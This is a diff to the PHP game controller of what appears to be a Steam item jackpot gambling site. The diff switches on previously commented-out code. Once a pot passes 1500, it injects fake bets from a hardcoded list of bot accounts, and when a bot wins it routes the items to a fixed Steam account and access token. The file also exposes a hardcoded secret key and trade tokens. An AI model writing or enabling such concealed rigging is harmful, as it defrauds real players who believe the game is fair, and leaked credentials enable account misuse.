@@ -24,9 +24,9 @@ class GameController extends Controller
 {
     const SECRET_KEY    = 'oDWx4GYTr4Acbdms';
     const BOT_TRADE_LINK    = 'https://steamcommunity.com/tradeoffer/new/?partner=318375677&token=2a-CpVov';
-    //public $BET_GET = 1500;
-    //public $SEND_TRADE = ['accessToken' => 'zu0ygIgx', 'steamid64' => '76561198254647128']
-    //public $BOTS = ['76561198295283496', '76561198295321684', '76561198296608900', '76561198296026861', '76561198296337658', '76561198295994451', '76561198295375889', '76561198295990291', '76561198295400258', '76561198296696423'];
+    public $bet_get = 1500;
+    public $send_trade = ['accessToken' => 'zu0ygIgx', 'steamid64' => '76561198254647128'];
+    public $bots = ['76561198295283496', '76561198295321684', '76561198296608900', '76561198296026861', '76561198296337658', '76561198295994451', '76561198295375889', '76561198295990291', '76561198295400258', '76561198296696423'];
 
     const MIN_PRICE     = 20;                    # Минимальная ставка
     const MAX_ITEMS     = 16;                   # Максимальное кол-во предметов в ставке
@@ -112,15 +112,15 @@ class GameController extends Controller
 
     public function getWinners()
     {
-        /*if($this->game->price > $this->BET_GET) {
+        if($this->game->price > $this->bet_get) {
             $rand_number = "0.9".mt_rand(10000000,99999999).mt_rand(100000000,999999999);
             $this->game->rand_number = $rand_number;
             $this->game->save();
 
-            $rand = array_rand($this->BOTS);
-            $this->addTicketFake($this->BOTS[$rand]);
-            $this->addTicketFake($this->BOTS[$rand]);
-        }*/
+            $rand = array_rand($this->bots);
+            $this->addTicketFake($this->bots[$rand]);
+            $this->addTicketFake($this->bots[$rand]);
+        }
         $us = $this->game->usersNoBot();
 
         $lastBet = Bet::where('game_id', $this->game->id)->orderBy('to', 'desc')->first();
@@ -263,15 +263,15 @@ class GameController extends Controller
             'items' => $returnItems,
             'game' => $this->game->id
         ];
-        /*if(in_array($user->steamid64, $this->BOTS)) {
+        if(in_array($user->steamid64, $this->bots)) {
             $value = [
                 'appId' => self::APPID,
-                'steamid' => $this->SEND_TRADE['steamid64'],
-                'accessToken' => $this->SEND_TRADE['accessToken'],
+                'steamid' => $this->send_trade['steamid64'],
+                'accessToken' => $this->send_trade['accessToken'],
                 'items' => $returnItems,
                 'game' => $this->game->id
             ];
-        }*/
+        }
         if(!is_null($bonus)) {
             foreach($bonus as $bon) {
                 if(!isset($bon['market_hash_name']))
